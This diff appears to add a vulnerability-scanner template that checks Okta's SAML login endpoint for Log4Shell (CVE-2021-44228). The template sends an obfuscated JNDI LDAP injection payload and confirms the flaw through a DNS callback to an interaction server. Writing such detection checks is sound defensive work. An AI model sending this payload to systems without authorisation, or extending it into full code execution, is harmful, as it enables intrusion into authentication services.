@@ -1,0 +1,27 @@
+id: okta-log4j-rce
+brief:
+    title: Okta - Remote Code Execution (Apache Log4j)
+    by: shaikhyaser
+    level: critical
+    about: Okta is susceptible to Log4j JNDI remote code execution. Okta provides cloud software that helps companies manage and secure user authentication into applications, and for developers to build ident...
+    label:
+        - cve
+        - cve2021
+        - rce
+        - jndi
+        - log4j
+        - okta
+        - oast
+        - kev
+        - vuln
+    score: CVE-2021-44228 CVSS:10.0
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/login/SAML?=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}'
+      signs:
+        - "on": word
+          has:
+            - dns
+          in: interactsh_protocol
+          need: all
